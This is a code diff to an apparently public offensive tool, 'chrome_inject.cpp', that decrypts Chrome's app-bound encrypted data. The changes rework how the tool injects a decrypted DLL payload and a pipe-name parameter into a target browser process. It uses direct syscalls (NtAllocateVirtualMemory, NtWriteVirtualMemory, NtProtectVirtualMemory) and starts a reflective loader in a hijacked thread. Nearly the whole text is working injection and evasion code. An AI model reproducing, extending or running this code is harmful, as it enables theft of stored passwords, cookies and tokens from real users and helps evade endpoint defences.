@@ -1,5 +1,5 @@
 // chrome_inject.cpp
-// v0.14.0 (c) Alexander 'xaitax' Hagenah
+// v0.14.1 (c) Alexander 'xaitax' Hagenah
 // Licensed under the MIT License. See LICENSE file in the project root for full license information.
 
 #include <Windows.h>
@@ -118,7 +118,7 @@ public:
         std::cout << "------------------------------------------------\n"
                   << "|  Chrome App-Bound Encryption Decryption      |\n"
                   << "|  Direct Syscall-Based Reflective Hollowing   |\n"
-                  << "|  x64 & ARM64 | v0.14.0 by @xaitax            |\n"
+                  << "|  x64 & ARM64 | v0.14.1 by @xaitax            |\n"
                   << "------------------------------------------------\n\n";
         ResetColor();
     }
@@ -485,29 +485,34 @@ public:
 
         m_console.Debug("Allocating memory for payload in target process.");
         PVOID remoteDllBase = nullptr;
-        SIZE_T payloadSize = m_decryptedDllPayload.size();
+        SIZE_T payloadDllSize = m_decryptedDllPayload.size();
+        SIZE_T pipeNameByteSize = (pipeName.length() + 1) * sizeof(wchar_t);
+        SIZE_T totalAllocationSize = payloadDllSize + pipeNameByteSize;
 
-        NTSTATUS status = NtAllocateVirtualMemory_syscall(m_target.getProcessHandle(), &remoteDllBase, 0, &payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+        NTSTATUS status = NtAllocateVirtualMemory_syscall(m_target.getProcessHandle(), &remoteDllBase, 0, &totalAllocationSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
         if (!NT_SUCCESS(status))
             throw std::runtime_error("NtAllocateVirtualMemory failed: " + Utils::NtStatusToString(status));
-        m_console.Debug("Payload memory allocated at: " + Utils::PtrToHexStr(remoteDllBase));
+        m_console.Debug("Combined memory for payload and parameters allocated at: " + Utils::PtrToHexStr(remoteDllBase));
 
-        m_console.Debug("Writing payload to target process.");
+        m_console.Debug("Writing payload DLL to target process.");
         SIZE_T bytesWritten = 0;
-        status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remoteDllBase, m_decryptedDllPayload.data(), m_decryptedDllPayload.size(), &bytesWritten);
+        status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remoteDllBase, m_decryptedDllPayload.data(), payloadDllSize, &bytesWritten);
         if (!NT_SUCCESS(status))
-            throw std::runtime_error("NtWriteVirtualMemory failed: " + Utils::NtStatusToString(status));
+            throw std::runtime_error("NtWriteVirtualMemory for payload DLL failed: " + Utils::NtStatusToString(status));
+
+        m_console.Debug("Writing pipe name parameter into the same allocation.");
+        LPVOID remotePipeNameAddr = reinterpret_cast<PBYTE>(remoteDllBase) + payloadDllSize;
+        status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remotePipeNameAddr, (PVOID)pipeName.c_str(), pipeNameByteSize, &bytesWritten);
+        if (!NT_SUCCESS(status))
+            throw std::runtime_error("NtWriteVirtualMemory for pipe name failed: " + Utils::NtStatusToString(status));
 
         m_console.Debug("Changing payload memory protection to executable.");
         ULONG oldProtect = 0;
-        status = NtProtectVirtualMemory_syscall(m_target.getProcessHandle(), &remoteDllBase, &payloadSize, PAGE_EXECUTE_READ, &oldProtect);
+        status = NtProtectVirtualMemory_syscall(m_target.getProcessHandle(), &remoteDllBase, &totalAllocationSize, PAGE_EXECUTE_READ, &oldProtect);
         if (!NT_SUCCESS(status))
             throw std::runtime_error("NtProtectVirtualMemory failed: " + Utils::NtStatusToString(status));
 
-        m_console.Debug("Passing pipe name parameter to target.");
-        LPVOID remotePipeNameAddr = passPipeNameToTarget(pipeName);
-
-        startPayloadInNewThread(remoteDllBase, rdiOffset, remotePipeNameAddr);
+        startHijackedThreadInTarget(remoteDllBase, rdiOffset, remotePipeNameAddr);
 
         m_console.Success("New thread created for payload. Main thread remains suspended.");
     }
@@ -529,22 +534,6 @@ private:
 
         m_decryptedDllPayload.assign((BYTE *)pData, (BYTE *)pData + dwSize);
         chacha20_xor(g_decryptionKey, g_decryptionNonce, m_decryptedDllPayload.data(), m_decryptedDllPayload.size(), 0);
-    }
-
-    LPVOID passPipeNameToTarget(const std::wstring &pipeName)
-    {
-        LPVOID remotePipeNameAddr = nullptr;
-        SIZE_T pipeNameSize = (pipeName.length() + 1) * sizeof(wchar_t);
-        NTSTATUS status = NtAllocateVirtualMemory_syscall(m_target.getProcessHandle(), &remotePipeNameAddr, 0, &pipeNameSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
-        if (!NT_SUCCESS(status))
-            throw std::runtime_error("NtAllocateVirtualMemory for pipe name failed: " + Utils::NtStatusToString(status));
-
-        SIZE_T bytesWritten = 0;
-        status = NtWriteVirtualMemory_syscall(m_target.getProcessHandle(), remotePipeNameAddr, (PVOID)pipeName.c_str(), pipeNameSize, &bytesWritten);
-        if (!NT_SUCCESS(status))
-            throw std::runtime_error("NtWriteVirtualMemory for pipe name failed: " + Utils::NtStatusToString(status));
-
-        return remotePipeNameAddr;
     }
 
     DWORD getReflectiveLoaderOffset()
@@ -598,7 +587,7 @@ private:
         return 0;
     }
 
-    void startPayloadInNewThread(PVOID remoteDllBase, DWORD rdiOffset, PVOID remotePipeNameAddr)
+    void startHijackedThreadInTarget(PVOID remoteDllBase, DWORD rdiOffset, PVOID remotePipeNameAddr)
     {
         m_console.Debug("Creating new thread in target to execute ReflectiveLoader.");
 
